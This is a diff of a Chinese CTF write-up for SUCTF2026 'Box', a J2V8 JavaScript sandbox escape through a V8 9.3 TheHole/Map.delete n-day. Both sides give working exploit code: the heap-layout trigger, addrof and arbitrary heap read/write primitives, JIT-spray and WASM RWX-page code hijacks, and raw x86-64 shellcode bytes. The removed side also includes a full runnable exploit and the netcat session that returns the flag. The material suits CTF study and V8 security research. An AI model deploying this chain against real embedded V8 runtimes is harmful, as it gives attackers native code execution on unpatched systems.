@@ -1,165 +1,72 @@
 # SUCTF2026-Box
 
 ## 题目简述
-题目提示是 `java, but not java`，附件实际是一个基于 J2V8 的 JavaScript 执行沙箱：程序读取选手输入的 JS，直到单独一行 `EOF`，随后创建 V8 runtime，注册宿主回调 `log()` 并执行脚本。宿主没有暴露 Java 反射、`require` 或 Nashorn 风格对象，因此常规 Java 沙箱逃逸不可行。
 
-真正攻击面在 J2V8 内嵌的 V8 `9.3.345.11`。可利用 CVE-2021-38003 相关 `JSON.stringify` hole 构造数组 OOB，再搭建 `addrof`、V8 heap 读写和 wasm RWX 页写 shellcode，最终从脚本执行器中逃逸。
+附件表面上是 Java 程序，实际通过 [J2V8](https://github.com/eclipsesource/J2V8) 在 JVM 内嵌 V8。`App.java` 最多读取 1 MiB JavaScript，以单独一行 `EOF` 结束，只向脚本注册一个 `log()` 回调，然后调用 `v8.executeScript()`。
+
+宿主没有暴露 Java 对象、反射、`require` 或 Nashorn 风格接口，常规 Java 沙箱逃逸不是主线。J2V8 JNI 库报告的 V8 版本是 `9.3.345.11`，又因项目没有及时吸收 V8 安全修复而保留 TheHole 利用链：从 `JSON.stringify` 异常中泄漏 V8 内部 `TheHole` 哨兵，用它破坏 `Map` 元数据、制造数组 OOB，再构造 `addrof` 和任意 V8 heap 读写，最终通过 JIT spray 或 WASM 代码页执行读取 `/flag` 的 shellcode。
 
 ## 解题过程
-一个非常精简的 J2V8 脚本执行器。读取用户输入的 JavaScript，直到遇到单独一行 EOF 为止，然后
-创建 V8 运行时，注册一个 log() 回调，最后直接执行脚本。
 
-基本排除常规 Java 沙箱逃逸路线。宿主侧只暴露了一个 log() ，没有 require ，没有 Java 对象
-直接暴露给脚本，也没有 Nashorn 风格的反射接口。因此攻击面主要集中在 J2V8 桥接层和底层 V8。
-在本地对 log() 回调相关的重入、toString() 、setter、Proxy 等行为测试，能得到一些宿主侧
-崩溃和异常状态，但都更接近 DoS，无法构造任意读写。于是寻找 V8 n-day。题目内嵌 V8 为
-9.3.345.11 。搜索后相近最适合的公开链是 CVE-2021-38003 ，即 JSON.stringify 相关
-的数组越界问题。JSON.stringify 会在异常路径上返回一个可利用的 hole ，后面配合 Map
-操作可以把某个数组的 length 篡改成超大值，从而形成 OOB。网上的公开 PoC 不能直接使用, 要
-把堆布局重新调整, 最终调试后稳定布局如下：
+### 1. 确认引擎版本和编译参数
 
-```javascript
-const oob_arr = [1.1, 1.1, 1.1, 1.1];
-const helper_arr = [];
-const victim_arr = [2.2, 2.2, 2.2, 2.2];
-const obj_arr = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 4 }];
+JAR 中的包名为 `com.eclipsesource.v8`，对应 J2V8。可以用库自身的接口确认版本：
 
-map.set(0x19, 0x100);
-map.set(0x111, oob_arr);
-helper_arr[1] = 0x100;
-```
+```java
+import com.eclipsesource.v8.V8;
 
-helper_arr 必须是空数组。该布局下，helper_arr[1] 会别名到 oob_arr.length ，从
-而把 oob_arr.length 扩成大值，获得稳定 OOB。随后通过本地探针和 gdb 对照，确认出以下几
-个关键槽位：
-
-oob_arr[20] 对应 victim_arr.elements
-
-oob_arr[21] 对应 victim_arr.length
-
-oob_arr[52] 对应 obj_arr.elements
-
-oob_arr[53] 对应 obj_arr.length
-
-有了这些偏移以后，就可以构造 addrof 和任意 V8 heap 读写。首先保存原始布局，后续稳定性依
-赖于及时恢复这些字段, 不恢复会挂掉.
-
-```javascript
-const ORIG_VICTIM_ELEM = ftoi(oob_arr[20]);
-const ORIG_VICTIM_LEN = ftoi(oob_arr[21]);
-const ORIG_OBJ_ELEM = ftoi(oob_arr[52]);
-const ORIG_OBJ_LEN = ftoi(oob_arr[53]);
-
-function restore_layout() {
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-
-oob_arr[21] = itof(ORIG_VICTIM_LEN);
-oob_arr[52] = itof(ORIG_OBJ_ELEM);
-oob_arr[53] = itof(ORIG_OBJ_LEN);
+public class Main {
+    public static void main(String[] args) {
+        System.out.println(V8.getV8Version());
+    }
 }
 ```
 
-addrof 的实现方式是把 obj_arr[0] 写成目标对象，再把 obj_arr.elements 临时改成
-victim_arr.elements ，从 victim_arr[0] 读出对象地址：
+输出为：
 
-```javascript
-function addrof(obj) {
-oob_arr[52] = itof(ORIG_VICTIM_ELEM);
-oob_arr[53] = itof(ORIG_OBJ_LEN);
-obj_arr[0] = obj;
-return ftoi(victim_arr[0]);
-}
+```text
+9.3.345.11
 ```
 
-读出来的是 tagged pointer，实际使用时减去 1n 。
+V8 利用不仅依赖版本，也依赖构建选项。题目源码和 J2V8 对应提交的 [`linux-x64/args.gn`](https://github.com/eclipsesource/J2V8/blob/00dddaa31a80782abbe93c4a01f325db3c4975d6/v8/linux-x64/args.gn) 给出：
 
-任意 V8 heap 读写原语如下：
-
-```javascript
-function heap_read64(addr) {
-oob_arr[20] = itof((addr - 0x10n) | 1n);
-const out = ftoi(victim_arr[0]);
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-return out;
-}
-
-function heap_write64(addr, val) {
-oob_arr[20] = itof((addr - 0x10n) | 1n);
-victim_arr[0] = itof(val);
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-}
+```text
+target_os = "linux"
+target_cpu = "x64"
+is_debug = false
+is_component_build = false
+v8_monolithic = true
+v8_use_external_startup_data = false
+v8_enable_i18n_support = false
+v8_enable_pointer_compression = false
 ```
 
-恢复步骤不能省略, 在测试下如果省略会导致利用失败.
+最重要的是未启用 pointer compression；这个时代的构建也没有现代 V8 sandbox，因此 heap 中保留大量可直接利用的 64 位指针。调试版应沿用这些选项，只额外打开符号、反汇编、对象打印和 heap verify，避免因构建差异得到错误对象布局。
 
-有了 addrof 和 heap read/write 之后，构造一个最小 wasm, 借 wasm 实例拿可执行代码
-页：
+### 2. TheHole 漏洞的真实作用
 
-```javascript
-const wasm_code = new Uint8Array([
-0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0,
-1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4,
-
-132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128,
-0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128,
-128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4,
-109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132,
-128, 128, 128, 0, 0, 65, 42, 11
-]);
-const wasm_mod = new WebAssembly.Module(wasm_code);
-const wasm_instance = new WebAssembly.Instance(wasm_mod);
-const wasm_entry = wasm_instance.exports.main;
-```
-
-随后泄露 wasm_instance 地址，并从对象内部找到代码页, 本地调试确认稳定偏移为 inst +
-0x80 ：
+触发函数构造极深、极大的 JSON 序列化对象，使 `JSON.stringify` 进入异常路径：
 
 ```javascript
-const inst_addr = addrof(wasm_instance) - 1n;
-const rwx = heap_read64(inst_addr + 0x80n);
-```
-
-此时可以拿到对应的 rwx 页，但页首不是最终要执行的 wasm 函数体。调试发现 wasm_entry()
-实际执行位置在 rwx + 0x500 .
-
-wasm 代码页在前几次调用过程中还会经历 materialize/finalize。patch 过早，后续调用路径会把原
-始代码重新覆盖。稳定方案是先对 wasm_entry() 做足够次数的 warm-up，再写入代码，写入后
-立即恢复数组布局，最后再触发一次执行。
-
-### exp:
-
-```javascript
-const conv_ab = new ArrayBuffer(8);
-const conv_f64 = new Float64Array(conv_ab);
-const conv_u64 = new BigUint64Array(conv_ab);
-
-function ftoi(f) {
-conv_f64[0] = f;
-return conv_u64[0];
-}
-
-function itof(i) {
-conv_u64[0] = i;
-return conv_f64[0];
-}
-
 function trigger() {
-let a = [], b = [];
-let s = "\"".repeat(0x800000);
+    const a = [], b = [];
+    const s = '"'.repeat(0x800000);
+    a[20000] = s;
+    for (let i = 0; i < 10; i++) a[i] = s;
+    for (let i = 0; i < 10; i++) b[i] = a;
 
-a[20000] = s;
-for (let i = 0; i < 10; i++)
-a[i] = s;
-for (let i = 0; i < 10; i++)
-b[i] = a;
-try {
-JSON.stringify(b);
-} catch (hole) {
-return hole;
+    try {
+        JSON.stringify(b);
+    } catch (hole) {
+        return hole;
+    }
+    throw new Error("failed to trigger");
 }
-throw new Error("failed to trigger");
-}
+```
 
+捕获到的并非普通 JS 值，而是 V8 内部用来标记“空槽/已删除项”的 `TheHole`。利用代码把它作为 `Map` key：
+
+```javascript
 const hole = trigger();
 const map = new Map();
 map.set(1, 1);
@@ -167,241 +74,156 @@ map.set(hole, 1);
 map.delete(hole);
 map.delete(hole);
 map.delete(1);
+```
 
-const oob_arr = [1.1, 1.1, 1.1, 1.1];
-const helper_arr = [];
-const victim_arr = [2.2, 2.2, 2.2, 2.2];
-const obj_arr = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 4 }];
+`Map` 自己也用 TheHole 标记已删除 entry。旧版允许用户把同一个哨兵作为 key 再次删除，导致 `number_of_elements` / `number_of_deleted_elements` 与真实表内容失配；后续扩容、rehash 和插入可破坏相邻对象元数据。
 
-// With helper_arr = [], index 1 aliases oob_arr.length after the corruption.
-map.set(0x19, 0x100);
-map.set(0x111, oob_arr);
-helper_arr[1] = 0x100;
+V8 的[上游安全修复](https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/)正是在 `Map/Set/WeakMap/WeakSet.prototype.delete` 前加入检查，拒绝 `TheHoleConstant()`。题目中的 J2V8 V8 版本早于该修复，所以这条已公开的浏览器 n-day 在嵌入式组件中仍可利用。
 
-const ORIG_VICTIM_ELEM = ftoi(oob_arr[20]);
-const ORIG_VICTIM_LEN = ftoi(oob_arr[21]);
-const ORIG_OBJ_ELEM = ftoi(oob_arr[52]);
-const ORIG_OBJ_LEN = ftoi(oob_arr[53]);
+### 3. 官方布局：从损坏的 Map 得到 OOB
 
-function restore_layout() {
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-oob_arr[21] = itof(ORIG_VICTIM_LEN);
-oob_arr[52] = itof(ORIG_OBJ_ELEM);
-oob_arr[53] = itof(ORIG_OBJ_LEN);
+先准备 64 位整数与 double 的无损转换：
+
+```javascript
+const conv = new ArrayBuffer(8);
+const f64 = new Float64Array(conv);
+const u64 = new BigUint64Array(conv);
+
+function ftoi(value) {
+    f64[0] = value;
+    return u64[0];
 }
 
+function itof(value) {
+    u64[0] = value;
+    return f64[0];
+}
+```
+
+官方 exp 在损坏 Map 后进行如下布局：
+
+```javascript
+map.set(20, -1);
+const oob_arr = [1.1];
+const tmp_arr = [2.2];
+const rw_arr = [3.3];
+const obj_arr = [0xeada, rw_arr];
+map.set(0x41414145, 0);
+```
+
+在题目构建中，损坏的集合操作把 `oob_arr.length` 扩大，使它能覆盖后续数组的 elements 指针。官方调试得到：
+
+```text
+oob_arr[0x16] → obj_arr.elements 相关槽位
+oob_arr[0x11] → rw_arr.elements 相关槽位
+```
+
+这些索引不是 CVE 固有常量，而是当前堆布局的结果；更换数组创建顺序、V8 build 或 GC 状态后必须重新定位。
+
+### 4. 构造地址泄漏和任意读写
+
+官方原语如下：
+
+```javascript
 function addrof(obj) {
-oob_arr[52] = itof(ORIG_VICTIM_ELEM);
-oob_arr[53] = itof(ORIG_OBJ_LEN);
-obj_arr[0] = obj;
-
-return ftoi(victim_arr[0]);
+    obj_arr[1] = obj;
+    return ftoi(oob_arr[0x16]);
 }
 
-function heap_read64(addr) {
-oob_arr[20] = itof((addr - 0x10n) | 1n);
-const out = ftoi(victim_arr[0]);
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-return out;
+function aar(addr) {
+    oob_arr[0x11] = itof(addr - 0x10n);
+    return ftoi(rw_arr[0]);
 }
 
-function heap_write64(addr, val) {
-oob_arr[20] = itof((addr - 0x10n) | 1n);
-victim_arr[0] = itof(val);
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
+function aaw(addr, value) {
+    oob_arr[0x11] = itof(addr - 0x10n);
+    rw_arr[0] = itof(value);
 }
+```
 
-function writeBytes64(addr, bytes) {
-for (let i = 0; i < bytes.length; i += 8) {
-let q = 0n;
-for (let j = 0; j < 8 && i + j < bytes.length; j++) {
-q |= BigInt(bytes[i + j]) << (8n * BigInt(j));
-}
-heap_write64(addr + BigInt(i), q);
-}
-}
+`addrof` 返回的是 tagged pointer，使用对象本体地址时要根据该字段语义去掉低位 tag。`aar/aaw` 中的 `-0x10` 则是伪造 FixedDoubleArray elements 指针时对 header 的补偿，不等同于 tagged pointer 的 `-1`。
 
-const wasm_code = new Uint8Array([
-0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0,
-1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4,
-132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128,
-0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128,
-128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4,
-109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132,
-128, 128, 128, 0, 0, 65, 42, 11
-]);
-const wasm_mod = new WebAssembly.Module(wasm_code);
-const wasm_instance = new WebAssembly.Instance(wasm_mod);
-const wasm_entry = wasm_instance.exports.main;
+参赛队为提高稳定性采用四数组布局，OOB 索引为：
 
-const inst_addr = addrof(wasm_instance) - 1n;
-const rwx = heap_read64(inst_addr + 0x80n);
+```text
+oob_arr[20] → victim_arr.elements
+oob_arr[21] → victim_arr.length
+oob_arr[52] → obj_arr.elements
+oob_arr[53] → obj_arr.length
+```
 
-const shellcode = [
-0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x66, 0x6c, 0x61, 0x67,
-0x00, 0x00, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0,
-0x02, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x81, 0xec, 0x00, 0x01,
-0x00, 0x00, 0x48, 0x89, 0xe6, 0xba, 0x00, 0x01, 0x00, 0x00, 0x48,
+它在每次读写后恢复上述四个字段。这个动作很重要：任意读写期间临时伪造的 elements 指针若跨过 GC、对象访问或后续 JIT 阶段仍未恢复，V8 很容易在扫描对象时崩溃。
 
-0x31, 0xc0, 0x0f, 0x05, 0x48, 0x89, 0xc2, 0xbf, 0x01, 0x00, 0x00,
-0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00,
-0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05
+### 5. 官方路线：JIT spray 劫持代码入口
+
+官方 exp 把机器码编码成若干 double 常量，并反复调用函数促使 TurboFan 生成包含这些常量的可执行代码：
+
+```javascript
+const sprayed = () => [
+    1.9553825422107533e-246,
+    1.9560612558242147e-246,
+    1.9995714719542577e-246,
+    1.9533767332674093e-246,
+    2.6348604765229606e-284,
 ];
 
+for (let i = 0; i < 80000; i++) {
+    sprayed();
+    sprayed();
+}
+```
+
+随后读取 JSFunction 的代码字段，并把入口改到 JIT 代码中经过对齐的 shellcode 位置：
+
+```javascript
+const function_addr = addrof(sprayed);
+const code_addr = aar(function_addr + 0x30n);
+const shellcode_entry = code_addr + 0xcdn - 0x5fn;
+aaw(function_addr + 0x30n, shellcode_entry);
+sprayed();
+```
+
+`+0x30`、`+0xcd-0x5f` 都绑定 V8 9.3.345.11 和这段喷射代码。应在调试版中反汇编生成的 code object，确认入口确实落到 double 常量承载的指令序列。最终 shellcode 执行 `open("/flag") → read → write(1, ...)`。
+
+### 6. 参赛队路线：改写 WASM 代码页
+
+另一种做法是实例化导出函数 `main` 的最小 WASM 模块，通过 `addrof` 得到 `WebAssembly.Instance` 地址，再读取 NativeModule/代码页指针。参赛队对题目构建确认：
+
+```javascript
+const inst_addr = addrof(wasm_instance) - 1n;
+const rwx = heap_read64(inst_addr + 0x80n);
+```
+
+这里 `rwx` 指向代码页基址，但 `wasm_entry()` 最终执行的函数体位于该页 `+0x500`。利用必须先让函数完成 materialize/finalize：
+
+```javascript
 for (let i = 0; i < 0x1000; i++) {
-wasm_entry();
+    wasm_entry();
 }
 
 writeBytes64(rwx + 0x500n, shellcode);
-
 restore_layout();
 wasm_entry();
 ```
 
-```javascript
-❯ nc <target> 10008
-____ _ _ ____
-/ ___|| | | | __ ) _____ __
-\___ \| | | | _ \ / _ \ \/ /
-___) | |_| | |_) | (_) > <
-|____/ \___/|____/ \___/_/\_\
+如果过早 patch，后续 WASM 编译/终结阶段会用原始机器码重新覆盖该页。先 warm-up、再写入、立即恢复数组布局、最后调用，是这条路线稳定的关键。shellcode 同样直接打开 `/flag`、读取并写到 stdout。
 
-A simple script sandbox. Enter JavaScript below.
-End your input with 'EOF' on a new line.
-─────────────────────────────────────────────────
-const conv_ab = new ArrayBuffer(8);
-const conv_f64 = new Float64Array(conv_ab);
-const conv_u64 = new BigUint64Array(conv_ab);
+### 7. 执行结果
 
-function ftoi(f) {
-conv_f64[0] = f;
-return conv_u64[0];
-}
+向服务发送 JavaScript 后，以单独一行结束：
 
-function itof(i) {
-conv_u64[0] = i;
-return conv_f64[0];
-}
-
-function trigger() {
-let a = [], b = [];
-let s = "\"".repeat(0x800000);
-a[20000] = s;
-for (let i = 0; i < 10; i++)
-a[i] = s;
-
-for (let i = 0; i < 10; i++)
-b[i] = a;
-try {
-JSON.stringify(b);
-} catch (hole) {
-return hole;
-}
-throw new Error("failed to trigger");
-}
-
-const hole = trigger();
-const map = new Map();
-map.set(1, 1);
-map.set(hole, 1);
-map.delete(hole);
-map.delete(hole);
-map.delete(1);
-
-const oob_arr = [1.1, 1.1, 1.1, 1.1];
-const helper_arr = [];
-const victim_arr = [2.2, 2.2, 2.2, 2.2];
-const obj_arr = [{ x: 1 }, { x: 2 }, { x: 3 }, { x: 4 }];
-
-// With helper_arr = [], index 1 aliases oob_arr.length after the corruption.
-map.set(0x19, 0x100);
-map.set(0x111, oob_arr);
-helper_arr[1] = 0x100;
-
-const ORIG_VICTIM_ELEM = ftoi(oob_arr[20]);
-const ORIG_VICTIM_LEN = ftoi(oob_arr[21]);
-const ORIG_OBJ_ELEM = ftoi(oob_arr[52]);
-const ORIG_OBJ_LEN = ftoi(oob_arr[53]);
-
-function restore_layout() {
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-oob_arr[21] = itof(ORIG_VICTIM_LEN);
-oob_arr[52] = itof(ORIG_OBJ_ELEM);
-oob_arr[53] = itof(ORIG_OBJ_LEN);
-}
-
-function addrof(obj) {
-oob_arr[52] = itof(ORIG_VICTIM_ELEM);
-oob_arr[53] = itof(ORIG_OBJ_LEN);
-obj_arr[0] = obj;
-return ftoi(victim_arr[0]);
-}
-
-function heap_read64(addr) {
-oob_arr[20] = itof((addr - 0x10n) | 1n);
-const out = ftoi(victim_arr[0]);
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-return out;
-}
-
-function heap_write64(addr, val) {
-oob_arr[20] = itof((addr - 0x10n) | 1n);
-victim_arr[0] = itof(val);
-oob_arr[20] = itof(ORIG_VICTIM_ELEM);
-}
-
-function writeBytes64(addr, bytes) {
-for (let i = 0; i < bytes.length; i += 8) {
-let q = 0n;
-for (let j = 0; j < 8 && i + j < bytes.length; j++) {
-q |= BigInt(bytes[i + j]) << (8n * BigInt(j));
-}
-heap_write64(addr + BigInt(i), q);
-}
-}
-
-const wasm_code = new Uint8Array([
-0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0,
-1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4,
-132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128,
-0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128,
-128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4,
-109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132,
-128, 128, 128, 0, 0, 65, 42, 11
-]);
-const wasm_mod = new WebAssembly.Module(wasm_code);
-const wasm_instance = new WebAssembly.Instance(wasm_mod);
-const wasm_entry = wasm_instance.exports.main;
-
-const inst_addr = addrof(wasm_instance) - 1n;
-const rwx = heap_read64(inst_addr + 0x80n);
-
-const shellcode = [
-0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x66, 0x6c, 0x61, 0x67,
-0x00, 0x00, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0,
-0x02, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x81, 0xec, 0x00, 0x01,
-0x00, 0x00, 0x48, 0x89, 0xe6, 0xba, 0x00, 0x01, 0x00, 0x00, 0x48,
-0x31, 0xc0, 0x0f, 0x05, 0x48, 0x89, 0xc2, 0xbf, 0x01, 0x00, 0x00,
-0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00,
-0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05
-
-];
-
-for (let i = 0; i < 0x1000; i++) {
-wasm_entry();
-}
-
-writeBytes64(rwx + 0x500n, shellcode);
-
-restore_layout();
-wasm_entry();
+```text
 EOF
-─────────────────────────────────────────────────
-[*] Executing...
+```
+
+成功输出：
+
+```text
 SUCTF{y0u_kn@w_v8_p@tch_gap_we1!}
 ```
 
 ## 方法总结
-- 核心技巧：V8 n-day 利用链
-- 识别信号：Java/J2V8 只给 JS 执行和极少宿主 API，且 V8 版本落在已知漏洞范围。
-- 复用要点：先用公开漏洞调堆布局得到 OOB，再构造 addrof/heap read-write，借 wasm rwx 页执行 shellcode。
+
+这题不是 Java 反射逃逸，而是嵌入式 V8 的 patch gap。首轮应先识别 J2V8、获取精确 V8 版本和编译参数，再判断公开 V8 漏洞是否仍未修复。这里 `JSON.stringify` 只负责把内部 TheHole 泄漏到 JavaScript；真正把它变成内存破坏的是旧版集合实现允许 TheHole 进入 `Map.delete`，从而损坏哈希表计数并制造数组 OOB。
+
+获得 OOB 后，官方用 JIT spray 改写 JSFunction 代码入口，参赛队用 WASM 实例定位可执行代码页。两条路线都高度依赖当前 build 的对象字段和代码偏移，不能只按版本号照抄。调试时应保持 release build 的 pointer-compression 等关键参数一致，并在临时篡改 elements 指针后及时恢复布局，才能避免 GC 或后续编译阶段破坏利用状态。
